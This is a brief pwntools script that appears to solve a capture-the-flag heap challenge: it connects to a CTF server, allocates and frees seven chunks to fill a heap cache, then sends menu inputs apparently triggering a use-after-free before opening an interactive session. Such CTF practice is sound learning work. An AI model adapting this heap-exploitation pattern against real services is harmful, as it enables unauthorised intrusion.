from pwn import *
exe = context.binary = ELF("./main")
# r = process()
r = remote("ctf-chall.stembascc.com",5228)
def create_block():
    for i in range(7):
        r.sendline("1")
        r.sendline(f"{i}")
        r.sendline("A" * 127)

def free_block():
    for i in range(7):
        r.sendline("3")
        r.sendline(f"{i}")

create_block()
free_block()
r.sendline("4")
r.sendline("2")
r.sendline("0")
r.interactive()